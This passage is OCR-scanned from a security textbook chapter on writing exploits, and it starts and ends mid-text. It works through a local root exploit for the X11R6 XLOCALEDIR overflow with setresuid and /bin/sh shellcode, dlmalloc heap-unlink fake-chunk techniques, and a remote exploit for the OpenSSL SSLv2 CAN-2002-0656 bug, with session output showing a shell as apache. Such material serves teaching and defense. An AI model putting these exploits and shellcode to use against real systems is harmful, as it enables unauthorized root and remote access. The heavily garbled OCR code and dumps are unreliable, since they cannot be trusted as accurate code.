nique, at present, all publicly available security software analysis tools do little or nothing 
more than simply grep for the names of commonly misused LIBC functions. This is 
effectively useless because nearly all widely used open-source software has been manually 
reviewed for these types of old and easy-to-find bugs for years. 

450 
Chapter 11 * Writing Exploits II 
To be blunt, a line-by-line review starting with functions that appear critical (those 
that directly take user-specified data via arguments, files, sockets, or manage memory) is 
the best approach. To confirm the exploitability of a bug found via reading the code, at 
least when the bug is not trivial, the software needs to be in its runtime (compiled and 
present in a real-world environment) state. This debugging of the "live" application in a 
test environment cannot be illustrated effectively in a textbook, but the following case 
study gives you a taste of the process. 
Case Study: X11R6 
4.2 XLOCALEDIR Overflow 
In the past, libraries were often largely overlooked by researchers attempting to find new 
security vulnerabilities. Vulnerabilities present in libraries can negatively influence the 
programs that utilize those libraries (see the case study titled "OpenSSL SSLv2 
Malformed Client Key Remote Buffer Overflow Vulnerability CAN-2002-0656"). 
The X11R6 4.2 XLOCALEDIR overflow is a similar issue.The X11 libraries contain a 
vulnerable strcpy call that affects other local system applications across a variety of plat-
forms. Any setuid binary on a system that utilizes the X11 libraries as well as the XLO-
CALEDIR environment variable has the potential to be exploitable. 
The Vulnerability 
We start off with merely the knowledge that there is a bug present in the handling of 
the XLOCALEDIR environment variable within the current installation (in this case, 
version 4.2) of XI1R6. Often, in real-world exploit development scenarios, an exploit 
developer will find out about a bug via a brief IRC message or rumor, a vague vendor-
issued advisory, or a terse CVS commit note such as "fixed integer overflow bug in 
copyout function." Even starting with very little information, we can reconstruct the 
entire scenario. First, we figure out what the XLOCALEDIR environment variable 
actually is. 
According to RELNOTES-X.org from the X11 R6 4.2 distribution, XLOCALEDIR: 
"Defaults to the directory $lJrojectRoot/lib/X 11/locale.The XLOCALEDIR variable can 
contain multiple colon-separated pathnames." 
Since we are only concerned with Xll applications that run as a privileged user (in this 
case, root), we perform a basic find request: 
$ find /usr7XllR6/bin -perm -4755 
/usrVXllR6/bin/xlock 
/usr/XHRG/bin/xscreensaver 
/usr/XllRe/bin/xtenn 
Other applications besides the ones returned by our find request may be affected. 
Those applications could reside in locations outside of/usr/X1 lR6/bin. Or they could 
reside within /usr/X 11 R6/bin, but not be setuid. Furthermore, it is not necessarily true 
that all of the returned applications are affected; they simply have a moderate likelihood 

Writing Exploits II • Chapter 11 
451 
of being affected since they were installed as part of the XI1R6 distribution and run 
with elevated privileges. We must refine our search. 
To determine if /usr/X 11 Rd/bin/xlock is affected, we do the following: 
$ export XLOCALEDIRV perl -e 'print "A-X70001" 
5 /usr/XHR6/bin/xlock 
Segmentation fault 
Whenever an application exits with a segmentation fault, it is usually a good indi-
cator that the researcher is on the right track, the bug is present, and that the application 
might be vulnerable. 
The following is the code to determine if/usr/X 1 lR6/bin/xscreensaver and 
/usr/Xl lR6/bin/xterm are affected: 
5 export XLOCALEDIR='perl -e 'print "A"x7000'' 
$ /usr/XllRS/bin/xterm 
/usr/XllR6/bin/xterm Xt error: Can't open display: 
5 /usr/xllK6/bin/xscreensaver 
xscreensaver; warning: $DISPLAY is not set: defaulting to ":0,0*. 
Segmentation fault 
The xscreensaver program exited with a segmentation fault, but xterm did not. Both 
also exited with errors regarding an inability to open a display. Let's begin by fixing the 
display error. 
$ export DISPLAY="10.0.6.76:0.0" 
$ /usr/XHR6/bin/xterm 
Segmentation fault 
3 /usr/XHR6/bin/xscreensaver 
Segmentation fault 
|""M"S| 
All three applications exit with a segmentation fault. Both xterm and xscreensaver 
UkiriiiJid require a lo< al or remote xserver to displ iv to so for simplicity's sake we will continue 
down the road of exploitation with xlock. 
1 S export XLOCALEDIR='perl -e 'print "A"x7000'' 
2 s gdb 
3 GNU gdb 5.2 
4 Copyright 2002 Free Software Foundation, Inc. 
5 GDB is free software, covered by the GNU General Public License, and you are welcome 
to change it and/or distribute copies of it under certain conditions. 
O Type "show copying" to see the conditions. 
7 There is absolutely no warranty for GDB. 
Type "show warranty" for details. 
8 This GDB was configured as "i386-slackware-linux*. 
9 
(gdb) file /usr/xllR6/bin/xlock 
I 0 Reading symbols from Zusr/X11R6/bin/xlock...(no debugging symbols found).-, done. 
II (gdb) run 
12 Starting program: /usr/XHR6/bin/xlock 
1 3 (no debugging symbols found)...(no debugging symbols found)... 
14 (no debugging symbols found)...(no debugging symbols found)... 
1 5 (no debugging symbols found)- -.(no debugging symbols found)-.-[New Thread 1/ 
1024 
(U»P 1839)1 
16 
17 Program received signal SIGSEGV, Segmentation fault. 
18 
[Switching to Thread 1024 (LWP 1839)1 
19 0x41414141 in ?? [) 

452 
Chapter 11 * Writing Exploits II 
20 (gdb) i r 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
eax 
•:.•(• x 
edx 
ebx 
esp 
ebp 
esi 
edi 
eip 
eflags 
cs 
as 
da 
es 
fs 
gs 
[other r 
0x0 
0 
0x403cla01 
Oxffffffff 
0x4022b934 
Oxbff£d844 
0x41414141 
0x8272b60 
0x403b4083 
0x41414141 
0x246 
582 
0x23 
3S 
0x2b 
43 
0x2b 
43 
0x2b 
43 
0x0 
0 
0x0 
0 
egisters truncated] 
1077680641 
-1 
1076017540 
0xbfffdB44 
0x41414141 
136784736 
1077624963 
0x41414141 
38 (gdb) 
As wc see here, the vulnerability is definitely exploitable via xlock. Ell3 has been 
completely overwritten with 0x41414141 (AAAA). As you recall from the statement, 
[export XLOCALEDIR='pcr!-e •prim "A"x7<W], the buffer (XLOCALEDIR) con-
tains 7000 "A" characters.Therefore, the address of the instruction pointer, EIP, has been 
overwritten with a portion of our buffer. Based on the complete overwrite of the frame 
pointer and instruction pointer, as well as the size of our buffer, we can now reasonably 
assume that the bug is exploitable. 
To determine the vulnerable lines of code from xc/lib/Xl 1/lcFile.c, we use the fol-
lowing code: 
static void xlocaledir(char *buf, int buf_len) 
f 
char *ciir r *p = buf; 
int len = 0; 
dir = getenvCXLOCALEDIR") ; 
if (dir != NULL) { 
len = strlerHdir) ; 
strncpy(p, dir, buf_len) ; 
The vulnerability is present because in certain callings of xlocaledir, the value of dir 
(returned by the getenv call to the user buffer) exceeds int bufjen. 
- ^ The Exploit 
The following code exploits the XFree86 4.2 vulnerability on many Linux systems via 
multiple vulnerable programs such as xlock, xscreensaver, and xterm. 
1 
i-
2 
Original exploit: 
3 
** oC-localX.c - XFree86 Version 4.2.x local root exploit 
4 
** By dcryptr &i tarranta / oC 
5 
6 
This exploit is a modified version of the original oC-localX,c 
7 
built: to work without any offset. 

Writing Exploits II • Chapter 11 
453 
8 
9 
Some distro have the file: /usr/XHR6/bin/dga +s 
10 
This program isn't exploitable because it drops privileges 
11 
before running the XIib function vulnerable to this overflow. 
12 
13 
This exploit works on linux x86 on all distro. 
14 
1 5 
Tested on; 
16 
- Slackware 6.1 ( xlock, xscreensaver, xterm) 
17 
- Redhat 7.3 ( manual + s to xlock } 
18 
- Suse 6.1 ( manual +s to xlock ) 
19 
20 
by Inode <inode@mediaservice.net> 
21 
V 
22 
23 
#include <stdio.h> 
# include < s t d l i b . h> 
25 
^include <striitg.h> 
26 
#include <unistd.h> 
27 
28 static char shellcode[J • 
29 
30 
/* setresuid(0,0,0) ; -I 
31 
"\x31\xcu\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80-
32 
/* /bin/sh execvef); */ 
33 
"\x3i\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e-
34 
"\x39\xe3\xSO\x53\x89\xel\x31\xd2\xbO\xOb\xcd\x80" 
35 
/* exit<0); */ 
36 
-\x31\xdb\x89\xd8\xb0\x01\xcd\x8O"; 
37 
38 ttdefine ALIGN 0 
39 
40 
int main(int argc, char **argv) 
41 { 
42 
char bu£fer[6000]; 
43 
int i; 
4 4 
int ret; 
45 
char *env[3) = {buffer,shellcode, 
NULL); 
46 
4 7 
int *ap; 
48 
49 
strcpy(buffer, 
"XLOCALEDIR="(; 
50 
51 
printf("\nXFreefl6 4.2.x Exploit modified by Inode <inode@mediaservice.net>\n\n") ; 
52 
iff argc != 3 ) 
53 
t 
54 
print:f (" Usage: %s <full path> <name>\n",argv[0] ) ; 
printf("\n Example; %s /usr/XllR6/bin/xlock xlock\n\n"Fargv[0]); 
56 
return 1; 
57 } 
58 
59 
ret = Oxbffffffa - strlen(shellcode) - strlen(argv[11) 
; 
60 
61 
ap = (int *)< buffer + ALIGN + strlentbuffer) ); 
62 
63 
for fi = 0; i < sizeof(buffer) ; i += 4) 
64 
*ap++ = ret; 

454 
Chapter 11 * Writing Exploits II 
65 
66 
execle(argv[l], argv[2], NULL, env); 
67 
68 
return(O) ; 
69 ) 
The shelkode is found on lines 30 through 36. These lines of code are executed 
when the buffer is actually overflowed and starts a root-level shell for the attacker. The 
setresuid function sets the privileges to root, and then the execve call executes /bin/sh 
(bourne shell). 
Conclusion 
Vulnerabilities can often be found in libraries that are used by a variety of applications. 
Finding a critical library vulnerability can allow for a large grouping of vulnerable 
system scenarios so that even if one application isn't present, another can be exploited. 
Day by day, these vulnerabilities are more likely to become publicly disclosed and 
exploited. In this case, a vulnerable library affected the security of multiple privileged 
applications and multiple Linux distributions.The OpenSSL vulnerability affected several 
applications that used it, such as Apache and stunnel. 
Finding Exploitable Stack 
Overflows in Closed-Source Software 
Finding new exploitable vulnerabilities, of any nature, in closed-source software is largely 
a black art. By comparison to other security topics, it is poorly documented. 
Furthermore, it relies on a combination of interdependent techniques. Useful tools 
include disassemblers, debuggers, tracers, and fuzzers. Disassemblers and debuggers are a 
lot more powerful tools than tracers and fuzzers. Disassemblers revert code back to 
assembly, while debuggers allow you to interactively control the application you are 
testing in a step-by-step nature (examining memory, writing to memory, and other sim-
ilar functions). IDA is the best disassembler and recently added debugger support, 
although both SoftlCE (Win32 only) and gdb offer far more extensive debugging capa-
bilities. (Win32 refers to 32-bit Microsoft Windows operating systems such as Microsoft 
Windows NT 4.0, Windows 2000, and Windows XP Professional.) Tracers are simply 
in-line and largely automated debuggers that step through an application with minimal 
interactivity from the user. Fuzzers are an often-used but incomplete method of testing 
that is akin to low-quality bruteforcing. 
NOTE 
Fuzzers try to use an automated approach to finding new bugs in software. 
They tend to work by sending what they assume to be unexpected input for the 
target application. For example, a fuzzer may attempt to log in to an FTP server 
500,000 times using various usernames and passwords of random lengths, such 
as short lengths or abnormally long lengths. The fuzzer would potentially use 
every {or many) possible combinations until the FTP server elicited an abnormal 

Writing Exploits II • Chapter 11 
455 
response. Furthermore, the bug researcher could be monitoring the FTP server 
with a tracer to check for a difference in how the FTP server handled the input 
from the backend. This type of random guesswork approach does tend to work 
in the wild for largely unaudited programs. 
Fuzzers do more than simply send 8000 letter "A"s to the authentication 
piece of a network protocol, but unfortunately, not a lot more. They are ideal 
for quickly checking for common, easy-to-find mistakes (after writing an exten-
sive and custom fuzzer for the application in question), but not much more 
than that. The most promising in-development public fuzzer is SPIKE. 
Heap Corruption Exploits 
The heap is an area of memory utilized by an application and allocated dynamically at 
runtime (see Figure 11.5). It is common for buffer overflows to occur in the heap 
memory space, and exploitation of these bugs is different from that of stack-based buffer 
overflows. Since the year 2000, heap overflows have been the most prominent software 
security bugs discovered. Unlike stack overflows, heap overflows can be very inconsistent 
and have varying exploitation techniques. In this section, we will explore how heap 
overflows are introduced in applications, how they can be exploited, and what can be 
done to protect against them. 
Figure 11.5 
plication Memory Layout 
/ 
/ 
text 
* 
data 
heap 
bss 
stack 
An application dynamically allocates heap memory as needed. This allocation occurs 
through the function call malloc().The malloc() function is called with an argument 
specifying the number of bytes to be allocated and returns a pointer to the allocated 
memory. An example of how mallocQ is used is detailed in the following code snippet: 
^include <stdio.h> 
i::L 
main(void) 
char *buffer; 
buffer = malloc(1024); 

456 
Chapter 11 * Writing Exploits II 
In this snippet, the application requests that 1024 bytes are allocated on the heap, and 
malloc returns a pointer to the allocated memory. A unique characteristic of most oper-
ating systems is the algorithm used to manage heap memory. For example, Linux uses an 
implementation called Doug Lea Malloc, while Solaris operating systems uses the System 
V implementation.The underlying algorithm used to dynamically allocate and free 
memory is where the majority of the vulnerability lies. The inherent problems in these 
dynamic memory management systems are what allow heap overflows to be exploited 
succcssfully.The most prominently exploited malloc-based bugs that we will review are tfie 
Doug Lea malloc implementation and the System V AT&T implementation. 
Doug Lea Malloc 
Doug Lea Malloc (dlmalloc) is commonly utilized on Linux operating systems. This 
implementation's design allows easy exploitation when heap overflows occur. In this 
implementation, all heap memory is organized into "chunks."These chunks contain 
information that allows dlmalloc to allocate and free memory efficiently. Figure 11.6 
shows what heap memory looks like from dlmalloc's point of view. 
Figure 11.6 dlmalloc Chunk 
/ 
/ 
prevsiza 
size 
data 
* 
4 
The prcv_sizc element is used to hold the size of the chunk previous to the current 
one, but only if the chunk before is unallocated. If the previous chunk is allocated, 
prev_sizc is not taken into account and is used for the data element in order to save four 
bytes. 
The size element is used to hold the size of the currently allocated chunk. However, 
when malloc is called, four is added to the length argument and it is then rounded to 
the next double word boundary. For example, if malloc(9) is called, 16 bytes will be allo-
cated. Since the rounding occurs, this leaves the lower three bits of the element set to 0. 
Instead of letting those bits go to waste, dlmalloc uses them as flags for attributes on the 
current chunk.The lowest bit is the most important when considering exploitation. This 
bit is used for the PREV_INUSE flag, which indicates whether or not the previous 
chunk is allocated or not. 
Lastly, the data element is plainly the space allocated by mallocO returned as a 
pointer. This is where the data is copied and then utilized by the application. This por-
tion of memory is directly manipulated by the programmer using the memory manage-
ment functions such as memepy and memset. 
When data is unallocated by using the freeQ function call, the chunks are rear-
ranged.The dlmalloc implementation first checks if the neighboring blocks are free and 
if so, merges the neighboring chunks and the current chunk into one large block of free 

Writing Exploits II • Chapter 11 
457 
memory. After a free() occurs on a chunk of memory, the structure of the chunk changes 
as shown in Figure 11.7. 
Figure 11.7 Freed dlmaNoc Chunk 
/ 
/ 
prev_size 
size 
t 
ftf 
bk 
-
unused memory 
> 
? 
\i * N ^ H f i i 
The first eight bytes of the previously used memory are replaced by two pointers, 
called fd and bk. These pointers stand for forward and backward and are used to point to 
a doubly linked list of unallocated memory chunks. Every time a free{) occurs, the 
linked list is checked to see if any merging of unallocated chunks can occur. The unused 
memory is plainly the old memory that was contained in that chunk, but it has no effect 
after the chunk has been marked as not in use. 
The inherent problem with the dlmalloc implementation is the fact that the man-
agement information for the memory chunks is stored in-band with the data. What hap-
pens if one overflows the boundary of an allocated chunk and overwrites the next 
chunk, including the management information? 
When a chunk of memory is unallocated using freefj, some checks take place within 
the chunk_free() function. First, the chunk is checked to see if it borders the top-most 
chunk. If so, the chunk is coalesced into the top chunk. Secondly, if the chunk previous 
to the chunk being freed is set to "not in use," the previous chunk is taken off the linked 
list and is merged with the currently freed chunk. Example 11.4 shows a vulnerable pro-
gram using malloc. 
Example 11.4 Vulnerable Program Example 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
11 
15 
16 
#include <stdio.h> 
int 
{ 
5 
main(int argc, char **argv) 
char *pl; 
char *p2; 
pi - malloc(1024); 
p2 a malloc(S12); 
strcpylpl. argvtl)I 1 
free(pi); 
free(p2); 
exit10) ; 

458 
Chapter 11 * Writing Exploits II 
Analysis 
In this program, the vulnerability is found on line 10. A strcpy is performed without 
bounds checking into the buffer pi.The pointer pi points to 1024 bytes of allocated 
heap memory. If a user overflows past the 1024 allocated bytes, it will overflow into p2's 
allocated memory, including its management information.The two chunks are adjacent 
in memory, as can be seen in Figure 11.8. 
Figure 11.8 Current Memory Layout 
prev_size 
size 
data(p1) 
prev_siza 
size 
data[p2) 
If the pi buffer is overflowed, the prcv_size, size, and data of the p2 chunk will be 
overwritten. We can exploit this vulnerability by crafting a bogus chunk consisting of fd 
and bk pointers that control the order of the linked list. By specifying the correct addresses 
for the fd and bk pointers, we can cause an address to be overwritten with a value of our 
choosing. A check is performed to see if the overflowed chunk borders the top-most 
chunk. If so, the macro "unlink" is called.The following shows the relevant code: 
•define FD * ( n e x t - s f d + 12) 
idefine BK *lnext->bk + 8) 
^define P {next) 
#define unlink(P, EK, FD) 
{ 
BK = P->bk; 
\ 
FD = P->fd; 
\ 
FD->bk = BK; 
\ 
BK->fd = FD; 
\ 
) 
Because we can control the values of the bk and fd pointers, we can cause arbitrary 
pointer manipulation when our overflowed chunk is freed. To successfully exploit this 
vulnerability, a fake chunk must be crafted. The prerequisites for this fake chunk are that 
the size value has the least significant bit set to 0 (PR£V_INUSE off) and the prev_size 
and size values must be small enough, that when added to a pointer, they do not cause a 
memory access error. When crafting the fd and bk pointers, remember to subtract 12 
from the address you are trying to overwrite (remember the FD definition). Figure 1 1.9 
illustrates what the fake chunk should look like. 
/ 

Writing Exploits II • Chapter 11 
459 
Figure 11.9 Fake Chunk 
prev_size • Oxfffffffc 
size = Oxfffffffc 
fd = return location -12 
bk = return address 
Also keep in mind that bk + 8 will be overwritten with the address of "return loca-
tion — 12". If shellcode is to be placed in this location, you must have a jump instruction 
at "return address" to get past the bad instruction found at return address + 8. What 
usually is done is simply a jmp 10 with nop padding. After the overflow occurs with the 
fake chunk, the two chunks should look like that shown in Figure 11.10. 
Figure 11.10 Overwritten Chunk 
y 
prev_size = unknown 
size = 1024 
data (p1) = padding 
prev size = Oxfffffffc 
size = Oxfffffffc 
fd = return location -12 
bk = return address 
•• 
/ 
/ 
i 
> 
> 
Upon the second free in our example vulnerable program, the overwritten chunk is 
unlinked and the pointer overwriting occurs. If shellcode is placed in the address speci-
fied in the bk pointer, code execution will occur. 
Case Study: OpenSSL SSLv2 
Malformed Client Key Remote Buffer 
Overflow Vulnerability CAN-2002-0656 
A vulnerability is present in the OpenSSL software library in the SSL version 2 key 
exchange portion. This vulnerability affects many machines worldwide, so analysis and 
exploitation of this vulnerability is of high priority. The vulnerability arises from 
allowing a user to modify a size variable that is used in a memory copy function.The 
user has the ability to change this size value to whatever they please, causing more data 
to be copied.The buffer that overflows is found on the heap and is exploitable due to 
the data structure the buffer is found in. 

460 
Chapter 11 * Writing Exploits II 
The Vulnerability 
OpenSSL's problem is caused by the following lines of code: 
memepy (s->session->key_arg, &{p[s->s2->tmp.clear + s->s2->tmp.enc]} H 
(unsigned intl keya); 
A user has the ability to craft a client master key packet, controlling the variable 
keya. By changing kcya to a large number, more data will be written to s->scssion-
>kcy_ar£ than otherwise expected. The kcy_arg variable is actually an eight-byte array in 
the SSL_SESSION structure, located on the heap. 
Exploitation 
Since this vulnerability is in the heap space, there may or may not be an exploitation 
technique that works across multiple platforms.The technique presented in this case 
study will work across multiple platforms and does not rely on any OS-specific memory 
allocation routines. We are overwriting all elements in the SSL_SESSION structure that 
follow the key_arg variable. The SSL_SESS!ON structure is as follows: 
_ _ _ _ ^ _ 
1 
typedef struct ssl_session_st 
3 
int ssl_version; 
4 
unsigned int key_arg_length; 
5 
6 
unsigned char key_arg[SSL_MW(_KEY_ARG_LENGTHl ; 
7 
8 
int master_key_length; 
9 
unsigned char niaster_key[SSL_MAX_MASTER_KEY_LENGTH! ; 
10 
unsigned int session_id_length; 
11 
unsigned char session_id[SSL,_MW!_SSL,_SESSrON_ID_LENGTH]; 
12 
unsigned int sid_ctx_length; 
13 
unsigned char sid_ct3t[SSL_MA>;_SID_CTX_LENGTHl ; 
14 
int not_resumable; 
15 
struct sess„cert_st /* SESE_CERT */ *sess„cert; 
16 
X509 *peer; 
17 
long verify„result; /* only for servers */ 
18 
int references; 
19 
long timeout! 
20 
long time: 
21 
int compress_meth; 
22 
SSL_CIPHER "cipher; 
23 
unsigned long cipher_id; 
24 
STfcCK„OFiSSL_CIPHER) 'ciphers; /* shared ciphers? */ 
25 
CRYPTO_EX_DATA ex_data; /* application specific data */ 
26 
27 
struct ssl_session_st *prev,*next; 
28 
) ESL_SESSION; 
At first glance, there does not seem to be anything extremely interesting in this 
structure to overwrite (no function pointers). However, there are some prev and next 
pointers located at the bottom of the structure. These pointers are used for managing 
lists of ssl sessions within the software application. When an SSL session handshake is 
completed, it is placed in a linked list by using the following function: 

Writing Exploits II • Chapter 11 
461 
• (from ssl_sess.c - heavily truncated): 
^ ^ ^ Q 2 9 
s t a t i c void SSL_SESSION_list_add(SSL_CTX *ctx, 
S£L_SESSION 
*s) 
30 { 
31 
if 
( ( s - > n e x t != NULL) 
it 
{s->prev != NOLL)) 
32 
SSL_SESSION_list_reiriove(ctx,s) ; 
Basically, if the next and prev pointers are not NULL (which they will not be once 
we overflow them), OpenSSL will attempt to remove that particular session from the 
linked list.The overwriting of arbitrary 32-bit words in memory occurs in the SSL_SES-
SION_list_remove function: 
5-.4BES5 (from ssl_sess.c - heavily truncated): 
mmmmm 
33 
s t a t i c 
void SSL_SESSION_list_remove(SSL_CTX 
*ctx, 
SSL_SESSION *s) 
34 
35 
36 
37 
38 } 
In assembly 
0xlc532 
0xlc538 
<SSL. 
<SSL_ 
/* middle of l i s t */ 
s->next->prev=s->prev; 
s->p r e v - > n e x t = s - > n e x t ; 
code: 
.SESSION_list_remove+210?: 
_SESSION_list_remove+216>: 
mov 
mov 
%ecx,OxcO(%eax) 
Oxcl*ebp),%edx 
S V N t t E S i 
This code block allows the ability to overwrite any 32-bit memory address with 
another 32-bit memory address. For example, to overwrite the GOT address of strcmp, 
we would craft our buffer, whereas the next pointer contained the address of strcmp -
192 and the prev pointer contained the address to our shellcode. 
The Complication 
The complication for exploiting this vulnerability is two pointers located in the 
SSL_S£tS'S/0:Y structure: cipher and ciphers. These pointers handle the decryption rou-
tines for the SSL session. Thus, if they are corrupted, no decryption will take place suc-
cessfully and our session will never be placed in the list. To be successful, we must have 
the ability to figure out what these values are before we craft our exploitation buffer. 
Fortunately, the vulnerability in OpenSSL introduced an information leak problem. 
When the SSL server sends the "server finish" message during the SSL handshake, it 
sends to the client the sessiou_id found in the SSL_SESSIO\: structure. 
(from s2_srvr.c): 
1 
static int 
2 
server_finish(SSL * s) 
3 
[ 
4 
unsigned char *p; 
5 
6 
if (s->state == SSL2_ST_SEND_SERVER_FINISHED_A) 1 
7 
p = (unsigned char *) s->init_buf->data; 
8 
*(p++) = SSL2_KT_SERVER_FINISHED; 
9 
1 0 
memcpy(p, 
s - ^ s s s s i o n - > s e s s i o n _ i d H 
(unsigned 
i n t ) 
s-^Eession->session_id_Xength)? 
12 
/* p+=s->session->sessioia_id_ien.gt;h; 
*/ 
13 
14 
s - > s t a t e = SSL2_ST_SEND_SERVER_FINISHED_B; 
15 
£->init_mum = s - > s e s s i o n - > s e s s i o n _ i d _ l e n g t h + 1; 

462 
Chapter 11 * Writing Exploits II 
16 
s->init_oi£ = 0; 
17 
} 
18 
/* SSL2_ST_SEND_SERVER_FIWISHEE_B */ 
19 
return 
(ssl2_do_write(s)}; 
20 } 
On lines 10 and 11, OpenSSL copies to a buffer the session_id up to the length 
specified byses$ion_id_tengtk. The element $esstint_id_length is located below the key_aig 
array in the structure, thus we have the ability to modify its value. By specifying the ses-
siott_id_length to be 112 bytes, we will receive a dump of heap space from the OpenSSL 
server that includes the addresses of the cipher and ciphers pointers. 
Once the addresses of the cipher and ciphers has been acquired, a place needs to be 
found for the shellcode. First, we need to have shellcode that reuses the current socket 
connection. Unfortunately, shellcode that traverses the file descriptors and duplicates 
them to standard in/out/error is quite large in size.To cause successful shellcode execu-
tion, we have to break our shellcode into two chunks, placing one in the sessiou_id 
structure and the other in the memory following the SSL_SISSSK)N structure. 
Lastly, we need to have the ability to accurately predict where our shellcode is in 
memory. Due to the unpredictability of the heap space, it would be tough to bruteforce 
effectively. However, in fresh Apache processes, the first SSL_SESSION structure is 
always located at a static offset from the ciphers pointer (which was acquired via the 
information leak).To exploit successfully, we overwrite the global offset table address of 
stremp (because the socket descriptor for that process is still open) with the address of 
ciphers - 136. This technique has worked quite well and we've been able to successfully 
exploit multiple Linux versions in the wild. 
Improving the Exploit 
To improve the exploit we must find more GOT addresses to overwrite.These GOT 
addresses are specific to each compiled version of OpenSSL. To harvest GOT informa-
tion, use the objdump command as demonstrated by the following example. 
We can improve the exploit by .. . 
To gather offsets for a Linux system: 
$ objdump -R /usr/sbin/httpd | grep stremp 
080b0ac8 R_3 8 6_JUMF_SLOT 
stremp 
Edit the ultrassl.c source code and in the target array place: 
{ OxOSObOacS, "slackware 8.1"), 
Conclusion 
This exploit provides a platform-independent exploitation technique for the latest vul-
nerability in OpenSSL. Although exploitation is possible, the exploit may fail due to the 
state of the Web server one is trying to exploit. The more SSL traffic the target receives 
legitimately, the tougher it will be to exploit successfully. Sometimes the exploit must be 
run multiple times before it will succeed, however. As you can see in the following 
exploit execution, a shell is spawned with the permissions of the Apache user. 

Writing Exploits II • Chapter 11 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
(binddninsei -/coding/exploits/ultrassl) > ./ultrassl -t2 10.0.43.64 
ultrassl - an openssl <= 0. 9.6d apache exploit 
written by marshall beddoe <:marshall .beddoe@found5tone.com> 
exploiting redhat 7.2 (Enigma) 
using 104 byte shellcode 
creating connections: 20 of 20 
performing information leak: 
06 15 56 33 4b a2 33 24 
aa oo oo oo oo oo oo oo 
00 20 00 00 00 62 33 38 
39 30 33 35 37 32 64 65 
39 36 62 31 66 00 00 00 
00 00 00 00 00 01 00 00 
3d 00 00 00 00 8c 10 46 
03 
39 14 Oe 42 75 5a 22 f6 
oo oo oo oo oo oo oo oo 
31 61 30 63 61 38 66 36 
34 36 39 31 35 34 65 33 
00 £0 51 15 03 00 00 00 
00 2c 01 00 00 64 70 87 
40 OO 00 00 00 CD 51 15 
cipher 
ciphers 
Ox404610Sc 
0x081551c0 
performing exploitation.. 
Linux tobor 2.4.7-10 i686 unknown 
uid=48(apache) gid=43(apache} groups=48(apache) 
..V3K.3S9..BuZ". 
. ...B381a0caBf6 
903572de469154e3 
96blf 
Q 
dp. 
= 
F@ 
Q. 
I • 
|;.ttt. 
Exploit Code for OpenSSL SSLv2 
Malformed Client Key Remote Buffer Overflow 
The following code exploits the OpenSSL bug by causing a memory overwrite in the 
linked list portion of OpenSSL. Exploitation of this particular vulnerability yields access 
as user "apache". On most Linux systems, privilege escalation to root is trivial. 
i #include <^sys/types.h> 
ftinclude -csys/socket .h> 
#include <:netinet/in.h> 
#include -csys/signal .h> 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
#include <fcntlth> 
#include <Etdio,h> 
#include <stdlib.h> 
#include <string.h> 
#include ^unistd,h?-
#include 
#include 
'ultrassl.h" 
'shellcode.h" 
char *host; 
i n t con_immH 
d o _ s s l , 
portj 
u_long cipher, ciphers, brute_addr n 0j 
typedef struct { 
u_long retloc; 
u_long retaddr; 
char *name; 

464 
Chapter 11 * Writing Exploits II 
23 
} targets; 
24 
25 
targets target [] = { 
26 
(0x080850a0, 0xbfffda33, "redhat7.3 (Valhalla)"}, 
27 
{0x080850a0, Oxbfffda33, 
"test"), 
28 
{0x0, 0xbfbfdca8, •freebsd"}, 
29 
}; 
30 
31 
targets *my_target; 
32 
int target_num = sizeof (target) / sizeof (*target} ; 
33 
34 
void 
35 
sighanaier(int sig) 
36 { 
37 
int sockfd, rand_port; 
38 
39 
putchar( h\n h); 
40 
41 
rand_port = l+(int) (65535.0 * randO / (RAND_MAX + 31025.OH; 
42 
43 
putchar('\n'); 
44 
45 
populate(host, 80, con_num, do_ssl, rand^port); 
46 
47 
printf("performing exploitation..\n"); 
48 
sockfd = exploit(host, port, brute_addr, Oxbfffda38 , rand_port); 
49 
50 
iffsockfd ? 0) 
51 
shell(sockfd); 
52 
} 
53 
54 
int 
55 
rciaindnt argc, char **argv) 
56 
( 
57 
char opt; 
58 
char *p; 
59 
u_long addr = 0; 
60 
int sockfd, ver, i; 
51 
62 
ver = - l ; 
63 
port = 443; 
64 
do_ssl = 0; 
65 
p = argv[0) ; 
66 
con_nuin • 12; 
67 
68 
srand(time(lTOLL) " getpidO); 
69 
signal ISIGPIPE, ssighandler); 
70 
setvbuf(stdout, NULL, _IONBF, 0); 
71 
72 
puts ("ultrassl - an openssl <;= 0 . 9 . 6d apache exploit\n p 
73 
"written by marshal1 beddoe <marshallTbeddoe@foundstone,com>"); 
74 
75 
if (argc < 2) 
76 
usage(p); 
77 
78 
while ((opt = getopt(argc, argv, "p:o:a:t:s")) != EOF) ( 
79 
switch (opt) ( 

Writing Exploits II • Chapter 11 
SO 
81 
82 
83 
case ' p ' : 
81 
port = atoi{optarg)j 
82 
break; 
case 'c': 
84 
con_num = atoi {optarg) ; 
85 
break; 
86 
case 'a 1: 
87 
addr = strtoul(optarg H NULL, 0); 
88 
break; 
89 
case ' t' : 
90 
ver = atoi (optarg) - 1; 
91 
break; 
92 
case 's ' : 
93 
do_ssl = 1; 
94 
break; 
95 
default: 
96 
usage(p) ; 
97 
} 
98 
} 
99 
1 00 
argv += optind; 
1 01 
host = argv[0); 
102 
103 
ver = 0; 
104 
105 
if ((ver < 0 | | ver >= target_num) &&. ladtir) { 
106 
printf("\ntargets:\n"); 
107 
for (i = 0; i <s targe t_nunij i++) 
108 
printf(" 
-t%a\t%5\n-, i + 1. target [i] .name) ; 
109 
e x i t ( - l ) ; 
110 
) 
111 
mY_target • target + ver; 
112 
113 
if 
(addr) 
114 
brute_addr = addr; 
115 
116 
if 
(ihost) 
117 
usage (p) ; 
118 
119 
printf("using %a byte shellcode\n-, sizeof (shellcode)>; 
120 
121 info leak {host, port) ; 
122 
1 23 
iff!brute_addr> 
124 
brute_addr = cipher + 8192? //0x08O83el8; 
125 
126 
putchar[•\n"J; 
127 
128 
for(i = 0; i < 1024; i++, { 
129 
int sd; 
130 
131 
printf("brute force; 
0x%x\r", brute_addr)j 
132 
133 
sd = exploit(host, port, brute_addr, Oxbfffda38, 0); 
134 
135 
if (sd > 0) { 
136 
